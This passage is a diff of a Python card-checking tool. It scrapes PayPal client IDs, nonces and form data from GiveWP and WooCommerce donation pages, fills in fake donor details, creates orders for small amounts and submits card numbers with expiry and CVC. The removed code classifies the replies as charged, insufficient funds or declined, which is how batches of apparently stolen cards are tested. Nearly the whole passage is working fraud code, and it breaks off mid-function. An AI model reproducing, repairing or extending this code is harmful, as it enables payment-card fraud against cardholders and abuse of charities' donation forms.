-            'address_2': 'Apt 4B', 'address2': 'Apt 4B',
-            'give-city': 'New York City', 'give-state': 'NY',
-            'give-zip': '10001', 'give-country': 'US', 'give-phone': '2125551234',
-            'address1': '123 Main Street', 'city': 'New York City',
-            'state': 'NY', 'zip': '10001', 'country': 'US', 'phone': '2125551234',
-            'billing_address_2': 'Apt 4B', 'shipping_address_2': 'Apt 4B',
-            'billing_first_name': 'John', 'billing_last_name': 'Doe',
-            'billing_address_1': '123 Main Street', 'billing_address_2': 'Apt 4B',
-            'billing_city': 'New York City', 'billing_state': 'NY',
-            'billing_postcode': '10001', 'billing_country': 'US', 'billing_phone': '2125551234',
-            'billing_email': self.email,
-        }
-
-    def get_terms_data(self):
-        return {
-            'give_agree_to_terms': '1', 'give_tos_agree': '1',
-            'give_terms_agreement': '1', 'give_terms': '1',
-            'agree_to_terms': '1', 'tos_agree': '1',
-            'terms': '1', 'terms_conditions': '1',
-        }
-
-    def get_base_form_data(self):
-        form_data = self.form_data.copy()
-        first_name = random.choice(self.first_name)
-        last_name = random.choice(self.last_name)
-        form_data.update({
-            'give-amount': self.minimum_amount, 'give-currency': self.currency,
-            'currency': self.currency, 'payment-mode': self.gateway_type,
-            'give_first': first_name, 'give_last': last_name,
-            'first_name': first_name, 'last_name': last_name,
-            'give_email': self.email, 'email': self.email,
-            'give-gateway': self.gateway_type, 'give_company': '',
-            'give_comment': '', 'give_anonymous': '0',
-        })
-        form_data.update(self.get_address_data())
-        form_data.update(self.get_terms_data())
-        return form_data
-
-    def _extract_minimum_amount(self, html):
-        try:
-            patterns = [
-                r'minimum donation amount of \$([\d.]+)',
-                r'minimum donation amount of &euro;([\d.]+)',
-                r'minimum donation amount of €([\d.]+)',
-                r'minimum donation amount of £([\d.]+)',
-                r'minimum donation amount[^\d]*([\d.]+)',
-                r'data-min-amount=["\']([\d.]+)["\']',
-                r'data-minimum-amount=["\']([\d.]+)["\']',
-                r'min-amount=["\']([\d.]+)["\']',
-                r'minimum_amount=["\']([\d.]+)["\']',
-                r'min_amount=["\']([\d.]+)["\']',
-                r'name="give-form-minimum"[^>]*value="([^"]+)"',
-                r'data-give-form-minimum="([^"]+)"',
-                r'This form has a minimum donation amount of \$([\d.]+)',
-                r'This form has a minimum donation amount of &euro;([\d.]+)',
-            ]
-            for pattern in patterns:
-                match = re.search(pattern, html, re.IGNORECASE)
-                if match:
-                    amount = match.group(1)
-                    try:
-                        float(amount)
-                        self.minimum_amount = amount
-                        return
-                    except:
-                        continue
-            min_inputs = re.findall(r'<input[^>]*min=["\']([\d.]+)["\'][^>]*>', html, re.IGNORECASE)
-            if min_inputs:
-                valid_amounts = [x for x in min_inputs if x.replace('.', '').isdigit()]
-                if valid_amounts:
-                    self.minimum_amount = max(valid_amounts, key=float)
-                    return
-            self.minimum_amount = "1.00"
-        except:
-            self.minimum_amount = "1.00"
-
-    def _is_not_paypal_page(self, html):
-        if not html:
-            return True
-        indicators = ['paypal', 'client-id', 'client_id', 'admin-ajax', 'give-form', 'donation-form', 'give_paypal', 'paypal_commerce', 'givewp', 'ppcp', 'woocommerce']
-        return not any(ind in html.lower() for ind in indicators)
-
-    def _detect_gateway_type(self, html):
-        html_lower = html.lower()
-        
-        # WooCommerce PayPal Payments (PPCP)
-        if 'ppcp-gateway' in html_lower or 'ppcp' in html_lower or 'woocommerce_paypal_payments' in html_lower:
-            self.is_woocommerce = True
-            self.gateway_type = 'ppcp'
-            return
-        
-        # WooCommerce PayPal Standard
-        if 'woocommerce' in html_lower and 'paypal' in html_lower:
-            self.is_woocommerce = True
-            self.gateway_type = 'paypal_standard'
-            return
-        
-        # GiveWP Gateway detection
-        gateway_match = re.search(r'name="give-gateway"[^>]*value="([^"]+)"', html)
-        if gateway_match:
-            gateway = gateway_match.group(1).lower()
-            if 'paypal' in gateway:
-                self.gateway_type = gateway
-                return
-        
-        # GiveWP data attributes
-        if 'paypal-commerce' in html_lower or 'paypal_commerce' in html_lower:
-            self.gateway_type = 'paypal-commerce'
-        elif 'paypal_donations' in html_lower or 'paypal-donations' in html_lower:
-            self.gateway_type = 'paypal_donations'
-        elif 'paypal_standard' in html_lower or 'paypal-standard' in html_lower:
-            self.gateway_type = 'paypal_standard'
-        elif 'paypal_express' in html_lower or 'paypal-express' in html_lower:
-            self.gateway_type = 'paypal_express'
-        elif 'paypal' in html_lower:
-            self.gateway_type = 'paypal'
-
-    def _init_and_extract(self):
+    def load_page(self):
         try:
             headers = {
-                'user-agent': self.get_next_ua(),
+                'user-agent': random_ua(),
                 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'accept-language': 'en-US,en;q=0.9'
+                'accept-language': 'en-US,en;q=0.9',
             }
-            response = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=self.TIMEOUT)
-            self.cookies = dict(response.cookies)
-            html = response.text
-            if self._is_not_paypal_page(html):
-                self.is_valid_gateway = False
-                return
-            self._detect_gateway_type(html)
-            self._extract_client_id(html)
-            self._extract_form_data(html)
-            self._extract_ajax_url(html)
-            self._extract_minimum_amount(html)
-        except:
-            self.is_valid_gateway = False
+            r = self.session.get(
+                f'{self.scheme}://{self.domain}{self.path}',
+                headers=headers,
+                timeout=CONFIG['timeout']
+            )
+            self.raw_html = r.text
+            return r.status_code == 200
+        except Exception:
+            return False
 
-    def _extract_client_id(self, html):
+    def decode_base64_strings(self):
+        candidates = re.findall(r'["\']([A-Za-z0-9+/]{40,}={0,2})["\']', self.raw_html)
+        for c in candidates[:60]:
+            try:
+                decoded = base64.b64decode(c + '=' * (-len(c) % 4)).decode('utf-8', errors='ignore')
+                if decoded and len(decoded) > 10 and any(ch.isprintable() for ch in decoded):
+                    self.decoded_strings.append(decoded)
+            except:
+                continue
+
+    def find_sub_pages(self):
+        try:
+            soup = BeautifulSoup(self.raw_html, 'lxml')
+            for iframe in soup.find_all('iframe'):
+                src = iframe.get('src', '')
+                if src:
+                    full = urljoin(self.target_url, src)
+                    if full not in self.sub_pages:
+                        self.sub_pages.append(full)
+
+            donate_kw = ['donate', 'give', 'payment', 'checkout', 'pay', 'contribute', 'form']
+            for a in soup.find_all('a', href=True):
+                href = a['href']
+                if any(kw in href.lower() for kw in donate_kw):
+                    full = urljoin(self.target_url, href)
+                    if self.domain in full and full not in self.sub_pages and full != self.target_url:
+                        self.sub_pages.append(full)
+        except:
+            pass
+
+    def detect_gateways(self):
+        h = self.raw_html.lower()
+        for d in self.decoded_strings:
+            h += ' ' + d.lower()
+
+        found = []
+        sigs = {
+            'paypal-commerce':  ['paypal-commerce', 'paypal_commerce', 'ppcp', 'data-paypal-commerce'],
+            'paypal-donations': ['paypal_donations', 'paypal-donations', 'give_paypal_donations'],
+            'paypal-standard':  ['paypal_standard', 'paypal-standard', 'paypal-standard-ipn'],
+            'paypal-express':   ['paypal_express', 'paypal-express'],
+            'paypal':           ['paypal.com', 'paypalobjects', 'paypal-sdk', 'paypal-button'],
+            'givewp':           ['give-form', 'givewp', 'give_paypal', 'give-amount', 'give-form-id'],
+            'woocommerce':      ['woocommerce', 'wc-ajax', 'ppcp-gateway'],
+        }
+        for gw, kws in sigs.items():
+            for kw in kws:
+                if kw in h:
+                    found.append(gw)
+                    break
+        self.detected_gateways = found or ['unknown']
+
+        if 'paypal-commerce' in found or 'ppcp' in h:
+            self.gateway_type = 'paypal-commerce'
+        elif 'paypal-donations' in found:
+            self.gateway_type = 'paypal_donations'
+        elif 'paypal-standard' in found:
+            self.gateway_type = 'paypal_standard'
+        elif 'paypal-express' in found:
+            self.gateway_type = 'paypal_express'
+
+        return self.detected_gateways
+
+    def extract_client_id(self):
         patterns = [
-            r'client-id="([^"]+)"', 
-            r'client_id["\']?\s*[:=]\s*["\']([^"\']+)',
-            r'data-client-id="([^"]+)"', 
-            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_-]{20,})',
-            r'paypal_client_id["\']?\s*[:=]\s*["\']([^"\']+)', 
-            r'PAYPAL_CLIENT_ID["\']?\s*[:=]\s*["\']([^"\']+)',
             r'data-paypal-commerce-client-id="([^"]+)"',
             r'data-paypal-client-id="([^"]+)"',
             r'data-ppcp-client-id="([^"]+)"',
-            r'data-paypal-express-client-id="([^"]+)"',
-            r'data-paypal-donations-client-id="([^"]+)"',
-            r'data-paypal-standard-client-id="([^"]+)"',
-            r'merchant-id=["\']([A-Za-z0-9_-]{13,})["\']',
+            r'client-id="([A-Za-z0-9_\-]{20,})"',
+            r'"client_id"\s*:\s*"([A-Za-z0-9_\-]{20,})"',
+            r'"clientId"\s*:\s*"([A-Za-z0-9_\-]{20,})"',
+            r'client_id["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})',
+            r'clientId["\']?\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})',
+        ]
+        for p in patterns:
+            m = re.search(p, self.raw_html, re.IGNORECASE)
+            if m:
+                self.client_id = m.group(1)
+                return
+        scripts = re.findall(r'<script[^>]*>(.*?)</script>', self.raw_html, re.DOTALL | re.IGNORECASE)
+        for s in scripts:
+            for p in patterns:
+                m = re.search(p, s, re.IGNORECASE)
+                if m:
+                    self.client_id = m.group(1)
+                    return
+        long_ids = re.findall(r'["\']((A[A-Za-z0-9_\-]{40,}))["\']', self.raw_html)
+        if long_ids:
+            self.client_id = long_ids[0]
+            return
+        for d in self.decoded_strings:
+            m = re.search(r'["\']((A[A-Za-z0-9_\-]{40,}))["\']', d)
+            if m:
+                self.client_id = m.group(1)
+                return
+
+    def extract_form_data(self):
+        try:
+            soup = BeautifulSoup(self.raw_html, 'lxml')
+            for inp in soup.find_all('input', type='hidden'):
+                name = inp.get('name')
+                value = inp.get('value', '')
+                if name:
+                    self.form_data[name] = value
+        except:
+            pass
+
+        m = re.search(r'give-form-id["\']?\s*[:=]\s*["\']?(\d+)', self.raw_html)
+        if m:
+            self.form_id = m.group(1)
+        else:
+            for pat in [r'"formId"\s*:\s*"?(\d+)"?', r'data-form-id=["\']?(\d+)', r'data-order-id=["\']?(\d+)']:
+                m = re.search(pat, self.raw_html)
+                if m:
+                    self.form_id = m.group(1)
+                    break
+
+        m = re.search(r'give-form-hash["\']?\s*[:=]\s*["\']([a-f0-9]+)', self.raw_html)
+        if m:
+            self.form_hash = m.group(1)
+        else:
+            m = re.search(r'"formHash"\s*:\s*"([a-f0-9]+)"', self.raw_html)
+            if m:
+                self.form_hash = m.group(1)
+
+        m = re.search(r'give-form-id-prefix["\']?\s*[:=]\s*["\']([^"\']+)', self.raw_html)
+        if m:
+            self.form_id_prefix = m.group(1)
+
+        for pattern in [
+            r'"_ajax_nonce"\s*:\s*"([a-f0-9]+)"',
+            r'"nonce"\s*:\s*"([a-f0-9]+)"',
+            r'"security"\s*:\s*"([a-f0-9]+)"',
+            r'name="_wpnonce"\s+value="([a-f0-9]+)"',
+        ]:
+            for mm in re.finditer(pattern, self.raw_html, re.IGNORECASE):
+                n = mm.group(1)
+                if n not in self.nonces:
+                    self.nonces.append(n)
+
+        for pattern in [
+            r'["\']action["\']\s*:\s*["\']([a-z_]+)["\']',
+            r'"action"\s*:\s*"([a-z_]+)"',
+            r'data-action="([a-z_]+)"',
+        ]:
+            for mm in re.finditer(pattern, self.raw_html, re.IGNORECASE):
+                a = mm.group(1)
+                if any(k in a for k in ['give_', 'paypal', 'ppcp', 'create_order',
+                                        'client_token', 'approve', 'checkout', 'wc_', 'order']):
+                    if a not in self.actions:
+                        self.actions.append(a)
+
+    def extract_ajax_url(self):
+        m = re.search(r'(?:var\s+)?ajaxurl\s*=\s*["\']([^"\']+)["\']', self.raw_html)
+        if m:
+            self.ajax_url = m.group(1)
+            if self.ajax_url.startswith('//'):
+                self.ajax_url = f'{self.scheme}:{self.ajax_url}'
+            elif self.ajax_url.startswith('/'):
+                self.ajax_url = f'{self.scheme}://{self.domain}{self.ajax_url}'
+            return
+
+        if 'admin-ajax.php' in self.raw_html:
+            self.ajax_url = f'{self.scheme}://{self.domain}/wp-admin/admin-ajax.php'
+        elif 'wc-ajax' in self.raw_html:
+            self.ajax_url = f'{self.scheme}://{self.domain}/?wc-ajax=checkout'
+
+    def detect_currency(self):
+        patterns = [
+            r'data-currency=["\']([A-Z]{3})["\']',
+            r'give-currency["\']?\s*[:=]\s*["\']([A-Z]{3})["\']',
+            r'"currency"\s*:\s*"([A-Z]{3})"',
         ]
         for pattern in patterns:
-            match = re.search(pattern, html, re.IGNORECASE)
-            if match:
-                self.client_id = match.group(1)
+            m = re.search(pattern, self.raw_html)
+            if m:
+                self.currency = m.group(1).upper()
                 return
-        script_matches = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL)
-        for script in script_matches:
-            for pattern in patterns:
-                match = re.search(pattern, script, re.IGNORECASE)
-                if match:
-                    self.client_id = match.group(1)
-                    return
-        long_strings = re.findall(r'["\']([A-Za-z0-9_-]{80,})["\']', html)
-        for string in long_strings:
-            if string.startswith(('A', 'B', 'E')):
-                self.client_id = string
+        symbols = [('€', 'EUR'), ('£', 'GBP'), ('¥', 'JPY'), ('₹', 'INR')]
+        for sym, code in symbols:
+            if re.search(r'(?:donation|give|amount|minimum|total)' + re.escape(sym), self.raw_html, re.IGNORECASE):
+                self.currency = code
                 return
+        self.currency = 'USD'
 
-    def _extract_form_data(self, html):
-        inputs = re.findall(r'<input[^>]*type="hidden"[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html)
-        for name, value in inputs:
-            self.form_data[name] = value
-        data_attrs = re.findall(r'data-([\w-]+)="([^"]+)"', html)
-        for attr_name, attr_value in data_attrs:
-            if any(k in attr_name.lower() for k in ['give', 'paypal', 'form', 'client', 'merchant', 'nonce', 'hash', 'ppcp', 'woocommerce', 'checkout', 'order']):
-                self.form_data[attr_name] = attr_value
+    def detect_donation_levels(self):
+        levels = []
+        matches = re.findall(r'data-amount=["\']?([\d.]+)["\']?', self.raw_html)
+        for m in matches:
+            try:
+                v = float(m)
+                if 1 <= v <= 5000 and v not in levels:
+                    levels.append(v)
+            except:
+                pass
+        for pattern in [
+            r'<input[^>]*type=["\']radio["\'][^>]*value=["\']?([\d.]+)["\']?',
+            r'give-amount[^>]*value=["\']?([\d.]+)["\']?',
+        ]:
+            for m in re.findall(pattern, self.raw_html, re.IGNORECASE):
+                try:
+                    v = float(m)
+                    if 1 <= v <= 5000 and v not in levels:
+                        levels.append(v)
+                except:
+                    pass
+        levels.sort()
+        self.donation_levels = levels[:8]
+        return self.donation_levels
 
-    def _extract_ajax_url(self, html):
-        if 'admin-ajax.php' in html:
-            self.ajax_url = f'https://{self.url}/wp-admin/admin-ajax.php'
-        elif 'wc-ajax' in html:
-            self.ajax_url = f'https://{self.url}/?wc-ajax=checkout'
-        elif 'rest_route' in html:
-            self.ajax_url = f'https://{self.url}/wp-json/'
+    def init(self):
+        if not self.load_page():
+            return False
+        self.decode_base64_strings()
+        self.find_sub_pages()
+        self.detect_gateways()
+        if self.detected_gateways == ['unknown']:
+            return False
+        self.extract_client_id()
+        self.extract_form_data()
+        self.extract_ajax_url()
+        self.detect_currency()
+        self.detect_donation_levels()
+        self.is_valid = True
+        return True
 
-    def _get_access_token(self):
+    def get_access_token(self):
         if not self.client_id:
             return None
         try:
-            headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json', 'content-type': 'application/x-www-form-urlencoded'}
-            response = self.r.post('https://api-m.paypal.com/v1/oauth2/token', headers=headers, data={'grant_type': 'client_credentials'}, auth=(self.client_id, ''), timeout=self.TIMEOUT)
-            if response.status_code == 200:
-                self.access_token = response.json().get('access_token')
+            headers = {'user-agent': random_ua(), 'accept': 'application/json'}
+            r = self.session.post(
+                'https://api-m.paypal.com/v1/oauth2/token',
+                headers=headers,
+                data={'grant_type': 'client_credentials'},
+                auth=(self.client_id, ''),
+                timeout=CONFIG['token_timeout']
+            )
+            if r.status_code == 200:
+                self.access_token = r.json().get('access_token')
                 return self.access_token
         except:
             pass
         return None
 
-    def _get_client_token(self):
-        if not self.ajax_url:
+    def _find_token_in_json(self, obj, depth=0):
+        if depth > 5:
             return None
-        try:
-            actions = [
-                'give_paypal_commerce_get_client_token',
-                'give_paypal_get_client_token',
-                'give_paypal_donations_get_client_token',
-                'give_paypal_standard_get_client_token',
-                'give_paypal_express_get_client_token',
-                'get_client_token',
-                'paypal_get_client_token',
-                'ppcp_get_client_token',
-                'wc_ajax_ppcp_get_client_token',
-            ]
-            for action in actions:
-                data = {'action': action, 'form-id': self.form_data.get('give-form-id', '')}
-                headers = {'user-agent': self.get_next_ua(), 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-                response = self.r.post(self.ajax_url, data=data, headers=headers, cookies=self.cookies, timeout=self.TIMEOUT)
-                if response.status_code == 200 and response.text:
-                    try:
-                        json_data = response.json()
-                        if 'data' in json_data:
-                            if isinstance(json_data['data'], dict):
-                                self.client_token = json_data['data'].get('client_token') or json_data['data'].get('token')
-                            elif isinstance(json_data['data'], str):
-                                self.client_token = json_data['data']
-                            if self.client_token:
-                                return self.client_token
-                    except:
-                        pass
-            return None
-        except:
-            return None
-
-    def _create_order(self):
-        if not self.is_valid_gateway:
-            return None
-        if self.ajax_url:
-            order_id = self._create_order_givewp()
-            if order_id:
-                return order_id
-        if self.access_token:
-            order_id = self._create_order_direct()
-            if order_id:
-                return order_id
-        if self.client_token:
-            order_id = self._create_order_with_client_token()
-            if order_id:
-                return order_id
+        if isinstance(obj, dict):
+            for k, v in obj.items():
+                if k.lower() in ['client_token', 'clienttoken', 'token', 'access_token', 'client_id', 'clientid']:
+                    if isinstance(v, str) and len(v) > 20:
+                        return v
+                res = self._find_token_in_json(v, depth + 1)
+                if res:
+                    return res
+        elif isinstance(obj, list):
+            for item in obj[:10]:
+                res = self._find_token_in_json(item, depth + 1)
+                if res:
+                    return res
         return None
 
-    def _create_order_givewp(self):
+    def get_client_token(self):
         if not self.ajax_url:
             return None
-        amounts = []
-        if self.minimum_amount != "1.00":
-            amounts.append(self.minimum_amount)
-        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
-        headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-        
-        actions = []
-        if self.gateway_type == 'paypal-commerce':
-            actions = ['give_paypal_commerce_create_order', 'give_create_order', 'create_order']
-        elif self.gateway_type == 'paypal_donations':
-            actions = ['give_paypal_donations_create_order', 'give_paypal_create_order', 'give_create_order', 'create_order']
-        elif self.gateway_type == 'paypal_standard':
-            actions = ['give_paypal_standard_create_order', 'give_paypal_create_order', 'give_create_order', 'create_order']
-        elif self.gateway_type == 'paypal_express':
-            actions = ['give_paypal_express_create_order', 'give_paypal_create_order', 'give_create_order', 'create_order']
-        else:
-            actions = ['give_paypal_create_order', 'give_create_order', 'create_order']
-        
-        for amount in amounts:
-            form_data = self.get_base_form_data()
-            form_data['give-amount'] = amount
-            form_data['amount'] = amount
-            for action in actions:
-                params = {'action': action}
-                try:
-                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=self.TIMEOUT)
-                    if response.status_code == 200 and response.text:
-                        try:
-                            json_data = response.json()
-                            if 'data' in json_data:
-                                if isinstance(json_data['data'], dict) and 'id' in json_data['data']:
-                                    return json_data['data']['id']
-                                elif isinstance(json_data['data'], str):
-                                    return json_data['data']
-                            if 'id' in json_data:
-                                return json_data['id']
-                            if 'order_id' in json_data:
-                                return json_data['order_id']
-                            if 'orderID' in json_data:
-                                return json_data['orderID']
-                        except:
-                            pass
-                except:
-                    continue
-        return None
-
-    def _create_order_direct(self):
-        if not self.access_token:
-            return None
-        try:
-            headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
-            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}], 'application_context': {'shipping_preference': 'NO_SHIPPING', 'user_action': 'PAY_NOW'}}
-            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=self.TIMEOUT)
-            if response.status_code in [200, 201]:
-                response_data = response.json()
-                if 'id' in response_data:
-                    return response_data['id']
-            return None
-        except:
-            return None
-
-    def _create_order_with_client_token(self):
-        if not self.client_token:
-            return None
-        try:
-            headers = {'authorization': f'Bearer {self.client_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua(), 'accept': 'application/json'}
-            data = {'intent': 'CAPTURE', 'purchase_units': [{'amount': {'currency_code': self.currency, 'value': self.donation}}]}
-            response = self.r.post('https://api-m.paypal.com/v2/checkout/orders', headers=headers, json=data, timeout=self.TIMEOUT)
-            if response.status_code in [200, 201]:
-                response_data = response.json()
-                if 'id' in response_data:
-                    return response_data['id']
-            return None
-        except:
-            return None
-
-    def _approve_order(self, order_id):
-        if self.ajax_url and 'admin-ajax' in self.ajax_url:
-            result = self._approve_order_givewp(order_id)
-            if result:
-                return result
-        if self.access_token:
+        headers = {
+            'user-agent': random_ua(),
+            'x-requested-with': 'XMLHttpRequest',
+            'origin': f'{self.scheme}://{self.domain}',
+            'referer': f'{self.scheme}://{self.domain}{self.path}',
+        }
+        for action in ['give_paypal_commerce_get_client_token',
+                       'give_paypal_get_client_token',
+                       'ppcp_get_client_token']:
+            data = {'action': action, 'form-id': self.form_id or '', 'form_id': self.form_id or ''}
+            if self.nonces:
+                data['nonce'] = self.nonces[0]
             try:
-                headers = {'authorization': f'Bearer {self.access_token}', 'content-type': 'application/json', 'user-agent': self.get_next_ua()}
-                response = self.r.post(f'https://api-m.paypal.com/v2/checkout/orders/{order_id}/capture', headers=headers, timeout=self.TIMEOUT)
-                return response
+                r = self.session.post(self.ajax_url, data=data, headers=headers, timeout=CONFIG['token_timeout'])
+                if r.status_code == 200 and r.text:
+                    try:
+                        j = r.json()
+                        t = self._find_token_in_json(j)
+                        if t:
+                            self.client_token = t
+                            return t
+                    except:
+                        toks = re.findall(r'["\'](A[A-Za-z0-9_\-]{40,})["\']', r.text)
+                        if toks:
+                            self.client_token = toks[0]
+                            return toks[0]
             except:
-                pass
+                continue
         return None
 
-    def _approve_order_givewp(self, order_id):
-        if not self.ajax_url:
-            return None
-        amounts = []
-        if self.minimum_amount != "1.00":
-            amounts.append(self.minimum_amount)
-        amounts.extend(["5.00", "10.00", "18.50", "25.00", "36.50", "50.00", "100.00"])
-        headers = {'user-agent': self.get_next_ua(), 'accept': 'application/json, text/javascript, */*; q=0.01', 'x-requested-with': 'XMLHttpRequest', 'origin': f'https://{self.url}', 'referer': f'https://{self.url}{self.inurl}', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8'}
-        
-        actions = []
-        if self.gateway_type == 'paypal-commerce':
-            actions = ['give_paypal_commerce_approve_order', 'give_approve_order', 'approve_order']
-        elif self.gateway_type == 'paypal_donations':
-            actions = ['give_paypal_donations_approve_order', 'give_paypal_approve_order', 'give_approve_order', 'approve_order']
-        elif self.gateway_type == 'paypal_standard':
-            actions = ['give_paypal_standard_approve_order', 'give_paypal_approve_order', 'give_approve_order', 'approve_order']
-        elif self.gateway_type == 'paypal_express':
-            actions = ['give_paypal_express_approve_order', 'give_paypal_approve_order', 'give_approve_order', 'approve_order']
-        else:
-            actions = ['give_paypal_approve_order', 'give_approve_order', 'approve_order']
-        
-        for amount in amounts:
-            form_data = self.get_base_form_data()
-            form_data['give-amount'] = amount
-            form_data['amount'] = amount
-            for action in actions:
-                params = {'action': action, 'order': order_id}
-                try:
-                    response = self.r.post(self.ajax_url, params=params, headers=headers, data=form_data, cookies=self.cookies, timeout=self.TIMEOUT)
-                    if response.status_code == 200:
-                        return response
-                except:
-                    continue
-        return None
-
-    def _clean_response(self, text):
-        if not text:
-            return "DECLINED"
-        text_strip = text.strip()
-        text_lower = text_strip.lower()
-
-        if text_lower == 'true':
-            return 'CHARGE 1.0'
-
+    def _find_order_id(self, text):
         try:
-            approve_json = json.loads(text_strip)
-            if isinstance(approve_json, dict):
-                if approve_json.get('success') is True:
-                    data = approve_json.get('data', {})
-                    if isinstance(data, dict):
-                        order = data.get('order', {})
-                        if isinstance(order, dict):
-                            order_status = str(order.get('status', '')).upper()
-                            payment_source = order.get('payment_source', {})
-                            card = payment_source.get('card', {}) if isinstance(payment_source, dict) else {}
-                            if order_status == 'COMPLETED' and card:
-                                return 'CHARGE 1.0'
+            j = json.loads(text)
+            if isinstance(j, dict):
+                for k in ['id', 'order_id', 'orderId', 'orderID']:
+                    if k in j:
+                        v = j[k]
+                        if isinstance(v, str) and len(v) > 10:
+                            return v
+                        if isinstance(v, int):
+                            return str(v)
+                if 'data' in j:
+                    d = j['data']
+                    if isinstance(d, dict):
+                        for k in ['id', 'order_id', 'orderId', 'orderID']:
+                            if k in d:
+                                v = d[k]
+                                if isinstance(v, str) and len(v) > 10:
+                                    return v
+                                if isinstance(v, int):
+                                    return str(v)
+                    elif isinstance(d, str) and len(d) > 10:
+                        return d
         except:
             pass
+        for p in [
+            r'"order[_-]?id"\s*:\s*"([^"]+)"',
+            r'"orderId"\s*:\s*"([^"]+)"',
+            r'"id"\s*:\s*"([A-Z0-9]{10,})"',
+        ]:
+            m = re.search(p, text)
+            if m:
+                c = m.group(1)
+                if len(c) >= 10:
+                    return c
+        return None
 
-        if 'insufficient' in text_lower:
-            return 'INSUFFICIENT_FUNDS'
+    def build_form_data(self, amount, nonce=''):
+        d = self.data
+        form = {
+            'give-form-id': self.form_id or '',
+            'give-form-id-prefix': self.form_id_prefix or '',
+            'give-form-hash': self.form_hash or '',
+            'give-amount': amount,
+            'amount': amount,
+            'give-currency': self.currency,
+            'currency': self.currency,
+            'payment-mode': self.gateway_type.replace('-', '_'),
+            'give-gateway': self.gateway_type.replace('-', '_'),
+            'give_first': d['first_name'],
+            'give_last': d['last_name'],
+            'give_email': d['email'],
+            'give_company': '',
+            'give_comment': '',
+            'give_anonymous': '0',
+            'give-address1': d['address'],
+            'give-address2': d['address2'],
+            'give-city': d['city'],
+            'give-state': d['state'],
+            'give-zip': d['zip'],
+            'give-country': 'US',
+            'give-phone': d['phone'],
+            'give_agree_to_terms': '1',
+            'give_tos_agree': '1',
+            'give_terms_agreement': '1',
+            'agree_to_terms': '1',
+            'accept_terms': '1',
+        }
+        form.update(self.form_data)
+        if nonce:
+            form['nonce'] = nonce
+            form['_ajax_nonce'] = nonce
+            form['_wpnonce'] = nonce
+        return form
 
-        for pr in self.paypal_responses:
-            if pr in text_strip.upper():
-                if pr == 'ORDER_NOT_APPROVED':
-                    return "Payer cannot pay for this transaction."
-                return pr
+    def create_order(self):
+        if not self.ajax_url:
+            return None, None
 
-        if len(text_strip) < 100:
-            return "PAYER_ACTION_REQUIRED"
+        amounts = list(CONFIG['amounts'])
+        if self.donation_levels:
+            amounts = [f"{l:.2f}" if l != int(l) else str(int(l)) for l in self.donation_levels]
 
-        return text_strip[:200]
+        priority = [a for a in self.actions if 'create_order' in a.lower()] + [
+            'give_paypal_commerce_create_order',
+            'give_paypal_donations_create_order',
+            'give_paypal_standard_create_order',
+            'give_paypal_express_create_order',
+            'give_paypal_create_order',
+            'ppcp_create_order',
+            'wc_ajax_ppcp_create_order',
+            'create_order',
+        ]
 
-    def Charge(self, ccx):
-        try:
-            if not self.is_valid_gateway:
-                return "INVALID_GATEWAY"
-            parts = ccx.strip().split("|")
-            if len(parts) < 4:
-                return "Invalid card format"
-            n, mm, yy, cvc = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
-            if "20" in yy:
-                yy = yy.split("20")[1]
-            expiry = f"20{yy}-{mm}"
-            order_id = self._create_order()
-            if not order_id:
-                return "Create Order Failed"
-            auth_tokens = []
-            if self.client_token:
-                auth_tokens.append(self.client_token)
-            if self.access_token:
-                auth_tokens.append(self.access_token)
-            if self.client_id:
-                auth_tokens.append(self.client_id)
-            confirm_res = None
-            confirm_json = {}
-            confirm_text = ""
-            for auth_token in auth_tokens:
-                he4 = {'authorization': f'Bearer {auth_token}', 'paypal-client-metadata-id': self.client_id or '', 'user-agent': self.get_next_ua()}
-                da3 = {'payment_source': {'card': {'number': n, 'expiry': expiry, 'security_code': cvc, 'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}}}}, 'application_context': {'vault': False}}
+        headers = {
+            'user-agent': random_ua(),
+            'x-requested-with': 'XMLHttpRequest',
+            'origin': f'{self.scheme}://{self.domain}',
+            'referer': f'{self.scheme}://{self.domain}{self.path}',
+        }
+
+        responses = []
+        for amount in amounts:
+            for action in priority[:6]:
+                for nonce in (self.nonces[:2] or ['']):
+                    form_data = self.build_form_data(amount, nonce)
+                    try:
+                        r = self.session.post(
+                            self.ajax_url,
+                            params={'action': action},
+                            data=form_data,
+                            headers=headers,
+                            timeout=CONFIG['timeout']
+                        )
+                        if r.status_code == 200 and r.text:
+                            text = r.text.strip()
+                            if text and text not in ['0', 'false', 'null', '[]', '{}']:
+                                responses.append(f"[{action} | ${amount}] {text[:200]}")
+                            oid = self._find_order_id(text)
+                            if oid:
+                                return oid, amount
+                    except:
+                        continue
+        if responses:
+            self._last_response = responses[0]
+        return None, None
+
+    def confirm_payment_source(self, order_id, card):
+        auth_tokens = [t for t in [self.client_token, self.access_token, self.client_id] if t]
+        n, mm, yy, cvc = card
+        if '20' in yy:
+            yy = yy.split('20')[1]
+        expiry = f"20{yy}-{mm}"
+        confirm_json = {}
+        confirm_text = ""
+        for auth_token in auth_tokens:
+            headers = {
